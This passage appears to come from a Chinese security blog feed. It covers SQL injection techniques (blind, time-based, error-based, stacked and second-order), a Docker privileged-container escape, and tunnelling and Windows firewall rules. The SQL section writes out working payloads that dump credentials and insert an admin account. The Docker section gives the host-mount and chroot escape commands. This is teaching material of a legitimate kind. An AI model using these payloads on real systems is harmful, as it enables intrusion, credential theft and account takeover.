data-num=\"69\"></td><td><pre>?id=1'</span><span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"d\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"71\"></td><td><pre>?id<span class=\"token operator\">=</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">20</span> <span class=\"token operator\">and</span> substr<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">select</span> username <span class=\"token keyword\">from</span> users <span class=\"token keyword\">limit</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">\"u\"</span> <span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>正常</pre></td></tr><tr><td data-num=\"73\"></td><td><pre>以此类推</pre></td></tr><tr><td data-num=\"74\"></td><td><pre>可以用burp爆破功能爆破出所有数据</pre></td></tr><tr><td data-num=\"75\"></td><td><pre>嫌弃太慢也可以写脚本或者用sqlmap</pre></td></tr></table></figure><h3 id=\"时间盲注\"><a class=\"markdownIt-Anchor\" href=\"#时间盲注\">#</a> <span class=\"kbd\">时间盲注</span></h3>\n<p>盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，单纯通过服务器返回内容的变化来判断是否存在 SQL 注入的方式 。</p>\n<p>可以用 benchmark，sleep 等造成延时效果的函数。</p>\n<p>如果 benkchmark 和 sleep 关键字被过滤了，可以让两个非常大的数据表做<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzMyNzYzNjQzL2FydGljbGUvZGV0YWlscy83OTE4NzkzMQ==\">笛卡尔积 (opens new window)</span> 产生大量的计算从而产生时间延迟；</p>\n<p>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。</p>\n<p>1、利用 sleep 判断数据库名长度</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string\">' and sleep(5) and 1=1--+\t页面返回不正常，延时5秒</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>'</span> <span class=\"token operator\">and</span> sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">and</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token comment\">--+\t页面返回不正常，不延时</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">--if (条件表达式，真，假) --C 语言的三目运算符类似</span></pre></td></tr></table></figure><p>2、获取数据库名</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">and</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>substr<span class=\"token punctuation\">(</span><span class=\"token keyword\">database</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">--+</span></pre></td></tr></table></figure><h3 id=\"报错注入\"><a class=\"markdownIt-Anchor\" href=\"#报错注入\">#</a> <span class=\"kbd\">报错注入</span></h3>\n<p>在 SQL 注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，利用报错函数获取数据库数据。</p>\n<p>常用的 MySQL 报错函数</p>\n<h4 id=\"updatexml函数\"><a class=\"markdownIt-Anchor\" href=\"#updatexml函数\">#</a> updatexml 函数</h4>\n<p>MySQL 的 UPDATEXML () 函数可以用于修改 XML 类型的数据，它可以更新 XML 数据中的一个或多个节点值。</p>\n<p>这个函数的参数有三个：</p>\n<ul>\n<li>XML 数据</li>\n<li>XPath 表达式：用于指定要修改的节点位置</li>\n<li>新的节点值：用于替换当前节点的值</li>\n</ul>\n<p>下面是 UPDATEXML () 函数的语法：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>下面是UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数的语法：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>UPDATEXML<span class=\"token punctuation\">(</span>xml_target<span class=\"token punctuation\">,</span> xpath_expr<span class=\"token punctuation\">,</span> new_val<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>其中，xml_target是要修改的XML类型的数据；xpath_expr是XPath表达式，用</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>于指定要修改的节点位置；new_val指定新的节点值。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>示例一：</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>假设数据表中有以下的XML类型的数据：</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">&lt;</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token operator\">&lt;</span>title<span class=\"token operator\">></span>MySQL Basics<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>title<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token operator\">&lt;</span>author<span class=\"token operator\">></span>John Doe<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>author<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token operator\">&lt;</span>price<span class=\"token operator\">></span><span class=\"token number\">19.99</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>price<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>book<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>我们可以使用UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数来修改一些节点的值：</pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">UPDATE</span> books</pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">SET</span> book <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>book<span class=\"token punctuation\">,</span> <span class=\"token string\">'/book/title'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'Learning MySQL'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>上面的语句将会把表中id为<span class=\"token number\">1</span>的记录的title节点的值修改为<span class=\"token string\">\"Learning MySQL\"</span>。</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>示例二：</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>现在有以下的XML类型的数据：</pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">&lt;</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token operator\">&lt;</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token operator\">&lt;</span>sender<span class=\"token operator\">></span>Tom<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>sender<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token operator\">&lt;</span>receiver<span class=\"token operator\">></span>Kate<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>receiver<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token operator\">&lt;</span>content<span class=\"token operator\">></span>Hello<span class=\"token punctuation\">,</span> how are you?<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>content<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>message<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>root<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>我们可以使用UPDATEXML<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数来替换节点的值，比如将消息内容的值替换为新的内容：</pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">UPDATE</span> messages</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">SET</span> msg <span class=\"token operator\">=</span> UPDATEXML<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> <span class=\"token string\">'/root/message/content'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'I am fine, thank you.'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token keyword\">WHERE</span> id <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>上面的语句将会把表中id为<span class=\"token number\">1</span>的记录的content节点的值修改为<span class=\"token string\">\"I am fine, thank you.\"</span>。</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\">--xpath 语法错误</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>extractvalue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t<span class=\"token comment\">-- 查询节点内容</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>updatexml<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t<span class=\"token comment\">-- 修改查询到的内容</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>它们的第二个参数都要求是符合xpath语法的字符串</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>如果不满足要求则会报错，并且将查询结果放在报错信息里</pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">-- 主键重复（duplicate entry）</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>floor<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\t\t<span class=\"token comment\">-- 返回小于等于该值的最大整数</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>只要是count，rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>，<span class=\"token keyword\">group</span> <span class=\"token keyword\">by</span> 三个连用就会造成这种主键重复报错</pre></td></tr></table></figure><h4 id=\"爆数据库\"><a class=\"markdownIt-Anchor\" href=\"#爆数据库\">#</a> 爆数据库</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/9689.png\" alt=\"\"></p>\n<p>–0x7e 是 &quot;~&quot; 符号的 16 进制，在这作为分隔符</p>\n<h4 id=\"爆表\"><a class=\"markdownIt-Anchor\" href=\"#爆表\">#</a> 爆表</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=“security”),0x7e),1)–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/tyuk.png\" alt=\"\"></p>\n<h4 id=\"爆字段\"><a class=\"markdownIt-Anchor\" href=\"#爆字段\">#</a> 爆字段</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=“security” and table_name=“users” limit 1,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/sdgfbsre.png\" alt=\"\"></p>\n<h4 id=\"爆数据\"><a class=\"markdownIt-Anchor\" href=\"#爆数据\">#</a> 爆数据</h4>\n<p>?id=1’%20 and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 4,1),0x7e),1) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/dthsrhtrs.png\" alt=\"\"></p>\n<h4 id=\"extractvalue函数用法\"><a class=\"markdownIt-Anchor\" href=\"#extractvalue函数用法\">#</a> –extractvalue 函数用法</h4>\n<p>?id=1’%20 and extractvalue(1,concat(0x7e,(select database()),0x7e))–+</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/shrthrthrhthe.png\" alt=\"\"></p>\n<p>–floor()</p>\n<p>?id=1’%20 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a) %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/989898.png\" alt=\"\"></p>\n<h3 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> <span class=\"kbd\">堆叠注入</span></h3>\n<p>堆叠查询：堆叠查询可以执行多条 SQL 语句，语句之间以分号 (;) 隔开，而堆叠查询注入攻击就是利用此特 点，在第二条语句中构造要执行攻击的语句。 在 mysql 里 mysqli_multi_query 和 mysql_multi_query 这两个函数执行一个或多个针对数据库的查询。多个查询用分号；进行分隔。</p>\n<p>但是堆叠查询只能返回第一条查询信息，不返回后面的信息。 select version ();select database () 堆叠注入的危害是很大的 可以任意使用增删改查的语句，例如删除数据库 修改数据库，添加数据库用户</p>\n<p>-1’ union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()  limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/0808.png\" alt=\"\"></p>\n<p>把库里所有的表获取出来，再获取字段 -1’ union select 1,2,(select group_concat (column_name) from information_schema.columns where TABLE_NAME=‘users’ limit 1)  %23</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/656565e.png\" alt=\"\"></p>\n<p>知道表的列的情况下使用 insert into 插入语句进行增加账号。如果是管理表 直接添加管理员账号即可 登录后台</p>\n<p>id=-999’;insert into users (id,username,password) values (1000,‘admin999’,‘123456’)–+ 访问 1000 即可访问到刚刚添加的账号</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/6666e.png\" alt=\"\"></p>\n<h3 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> <span class=\"kbd\">二次注入</span></h3>\n<p>二次注入漏洞是一种在 Web 应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏 洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。 二次注入原理 二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助</p>\n<p>get_magic_quotes_gpc 对其中的特殊字符进行了转义，但是 addslashes 有一个特点就是虽然参数在过滤 后会添加 “\\” 进行转义，但是 “\\” 并不会插入到数据库中，在写入数据库的时候还是保留了原来的数 据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接 从数据库中取出了脏数据，没有进行下一步的检验和处理，这样就会造成 SQL 的二次注入。比如在第一次 插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就 形成了二次注入.</p>\n<p>二次注入图解</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci1.png\" alt=\"\"></p>\n<p>现在密码是 admin 999999</p>\n<p>修改密码页面</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci2.png\" alt=\"\"></p>\n<p>注册 admin’#</p>\n<p>登陆进去</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci3.png\" alt=\"\"></p>\n<p>修改密码</p>\n<p>修改的是 admin 的密码</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci4e.png\" alt=\"\"></p>\n<p>登陆 admin 账户输入刚才更改的密码成功登陆</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/gyzero/2ci5.png\" alt=\"\"></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/",
            "url": "http://gyzero.shop/2023/10/27/%E6%BC%8F%E6%B4%9E/docker%E9%80%83%E9%80%B8/",
            "title": "docker逃逸",
            "date_published": "2023-10-27T06:33:01.000Z",
            "content_html": "<p><em>特权模式</em>逃逸</p>\n<p>当容器启动加上–privileged 选项时，容器可以访问宿主机上所有设备</p>\n<p>启动一个特权容器<br>\n <code>sudo docker run --rm --privileged -it ubuntu:18.04 bash</code></p>\n<p>判断容器是否特权启动<br>\n <code>查看磁盘，默认情况下容器执行fdisk -l 是无法查看的</code> <br>\n <code>fdisk -l</code></p>\n<p>查看 capEff 值，特权值为 0000003fffffffff<br>\n <code>cat /proc/self/status | grep CapEff</code></p>\n<p>#创建一个挂载目录<br>\n <code>mkdir /tmp/hosts</code></p>\n<p>#查看宿主机磁盘文件<br>\n <code>fdisk -l</code></p>\n<p>#挂载到创建的目录<br>\n <code>mount /dev/sda1 /tem/hosts/</code> <br>\n <code>cd /tmp/hosts/</code></p>\n<p>#通过 chroot 切换 bash<br>\n <code>chroot ./ bash</code></p>\n",
            "tags": []
        },
        {
            "id": "http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/",
            "url": "http://gyzero.shop/2022/11/12/network-security/neiwang/%E7%BB%95%E9%98%B2%E7%81%AB%E5%A2%99/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/",
            "title": "隧道代理",
            "date_published": "2022-11-12T09:10:18.000Z",
            "content_html": "<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316173022003.png\" alt=\"image-20240316173022003\"></p>\n<h3 id=\"代理技术\"><a class=\"markdownIt-Anchor\" href=\"#代理技术\">#</a> 代理技术</h3>\n<p>代理是一种有转发功能的应用程序，它扮演了位于服务器和客户端 “中间人” 的角色，接收由客户端发送的请求并转发给服务器，同时也接收服务器返回的响应并转发给客户端。简单来说，代理技术解决的是网络之间的通信问题，如内网与外网之间或者两者自己之间的通信，两个不同内网的通信就必须借助到代理，否则无法通讯。</p>\n<p>图中两台内网中的主机是无法直接通信的，但是两台主机可以与公网的 vps 通信在公网 vps 上做代理转发把两台主机的流量转发给双方</p>\n<ol>\n<li><strong>建立连接</strong>：首先，两台内网主机分别与公网 VPS 建立连接。这通常可以通过 SSH 或其他网络协议实现。</li>\n<li><strong>设置代理</strong>：在公网 VPS 上设置代理服务器，用于接收来自两台内网主机的请求，并将请求转发给另一台主机。</li>\n<li><strong>数据转发</strong>：当一台内网主机发送数据时，数据首先被发送到公网 VPS，然后由 VPS 将数据转发给另一台内网主机。</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315195904305.png\" alt=\"image-20240315195904305\"></p>\n<h3 id=\"隧道技术\"><a class=\"markdownIt-Anchor\" href=\"#隧道技术\">#</a> 隧道技术</h3>\n<p>隧道技术是一种网络通信策略，它允许不同网络的设备通过互联网进行安全的交流。简单来说，隧道技术解决了在网络通信中遇到的阻碍问题，例如绕过防火墙的过滤、处理网络连接和通讯问题，以及处理数据回链封装问题。有时候，我们发送的数据流量可能会被拦截，这时就需要利用隧道技术来绕过这种阻碍。隧道技术通过采用不同的协议，将本来无法通行的通信路径打通。在进入内部网络后，有些协议可能会被拦截，导致我们无法接收到目标设备的流量。这时，可以借助一些特殊的协议来建立隧道，以重新实现通信。</p>\n<p>图中两台主机在同一个内网可以通信的，但是防火墙禁止了一些协议导致通过这些走的流量会被拦截导致无法通信，这时候就可以使用例如 icmp 等重新搭建一条路让流量走这里进行通信，但是不可以使用 http 因为 http 协议是基于 tcp 的</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316164019233.png\" alt=\"image-20240316164019233\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240316171226537.png\" alt=\"image-20240316171226537\"></p>\n<h4 id=\"协议出网判断\"><a class=\"markdownIt-Anchor\" href=\"#协议出网判断\">#</a> 协议出网判断</h4>\n<p>ICMP:ping 命令</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140551020.png\" alt=\"image-20240422140551020\"></p>\n<p>DNS 协议：nslookup</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240422140907905.png\" alt=\"image-20240422140907905\"></p>\n<p>SSH 隧道：ssh:root@192.168.0.123 22 端口</p>\n<h4 id=\"关于正反shell\"><a class=\"markdownIt-Anchor\" href=\"#关于正反shell\">#</a> 关于正反 shell</h4>\n<p>什么是正向 shell 反向 shell</p>\n<p>正向就是攻击机主动去连接绑定的受害机的端口</p>\n<p>反向就是让受害机主动来连接攻击机的指定端口</p>\n<p>一般来讲对于防火墙入站规则是比出站规则严格的多，端口过滤的会很严格除非有没有被过滤且没有被占用的端口，这时就可以使用反弹 shell 进行上线，如果防火墙禁止了 TCP 出站，那么就需要使用其他协议来搭建隧道。</p>\n<h3 id=\"防火墙出入站规则\"><a class=\"markdownIt-Anchor\" href=\"#防火墙出入站规则\">#</a> 防火墙出入站规则</h3>\n<p>防火墙上有出站和入站规则</p>\n<p>出站规则就是本机去访问外网</p>\n<p>例如一些软件需要去访问互联网上的资源</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203256799.png\" alt=\"image-20240315203256799\"></p>\n<p>入站就是比如当前主机是一台 web 服务器用户来访问服务器上的网站</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203441398.png\" alt=\"image-20240315203441398\"></p>\n<p>Windows 防火墙提供了三种网络配置文件：域、专用和公用</p>\n<ol>\n<li><strong>域</strong>：当设备已加入 Active Directory 域，并且可以访问域控制器时，会自动应用域网络配置文件这种网络位置类型无法手动设置</li>\n<li><strong>专用</strong>：专用网络配置文件主要用于专用网络，如家庭网络或办公室网络管理员可以在网络接口上手动设置它</li>\n<li><strong>公用</strong>：公用网络配置文件主要用于公共网络，如公共 Wi-Fi 网络或其他共享网络这是身份不明网络的默认配置文件</li>\n</ol>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203842956.png\" alt=\"image-20240315203842956\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315203816409.png\" alt=\"image-20240315203816409\"></p>\n<h4 id=\"防火墙添加规则\"><a class=\"markdownIt-Anchor\" href=\"#防火墙添加规则\">#</a> 防火墙添加规则</h4>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315204831486.png\" alt=\"image-20240315204831486\"></p>\n<p>程序设置就是电脑里的一些软件</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315213822274.png\" alt=\"image-20240315213822274\"></p>\n<p>指定的端口例如 80 端口 http，22ssh</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214021610.png\" alt=\"image-20240315214021610\"></p>\n<p>自定义可以设置的更详细些</p>\n<p>比如可以规定那些协议可以通过，应用于指定的 ip</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214227534.png\" alt=\"image-20240315214227534\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214336145.png\" alt=\"image-20240315214336145\"></p>\n<p>当前主机有一个 web 服务 80 端口 http, 不想让别人访问到就可以设置入站规则</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214551009.png\" alt=\"image-20240315214551009\"></p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214620069.png\" alt=\"image-20240315214620069\"></p>\n<p>规则开启时无法访问</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214721993.png\" alt=\"image-20240315214721993\"></p>\n<p>规则关闭时则正常访问</p>\n<p><img data-src=\"https://tuchuang-1309689803.cos.ap-nanjing.myqcloud.com/%E5%86%85%E7%BD%91/%E5%9F%9F/image-20240315214830260.png\" alt=\"image-20240315214830260\"></p>\n<h4 id=\"命令行设置防火墙\"><a class=\"markdownIt-Anchor\" href=\"#命令行设置防火墙\">#</a> 命令行设置防火墙</h4>\n<pre><code class=\"language-cmd\">netsh advfirewall show currentprofile #查看防火墙状态\nnetsh advfirewall set allprofiles state on #开启防火墙\nnetsh advfirewall set allprofiles state off #关闭防火墙\nnetsh advfirewall firewall add rule name=&quot;80off&quot; dir=in action=block protocol=TCP localport=80 #禁止访问本地TCP协议80端口\nnetsh advfirewall firewall add rule name=&quot;80on&quot; dir=in action=allow protocol=TCP localport=80 #允许访问本地TCP协议80\nnetsh advfirewall firewall delete rule name=&quot;80off&quot; #删除名为80off的规则\nnetsh advfirewall firewall show rule name=&quot;http&quot; #查看名为http的防火墙规则\nnetsh advfirewall firewall add rule name=&quot;22&quot; dir=in protocol=tcp localport=22 action=block\n#阻止所有进入的 TCP 流量通过端口 22。\nnetsh advfirewall firewall add rule name=&quot;22on&quot; dir=in protocol=tcp localport=22 action=allow\n#允许所有进入的 TCP 流量通过端口 22。\nhttps://learn.microsoft.com/zh-cn/windows/security/operating-system-security/network-security/windows-firewall/rules#官方文档\n</code></pre>\n<h4 id=\"域组策略控制防火墙\"><a class=\"markdownIt-Anchor\" href=\"#域组策略控制防火墙\">#</a> 域组策略控制防火墙</h4>\n<p>在一个域环境中，域控制器（Domain Controller）可以通过组策略（Group 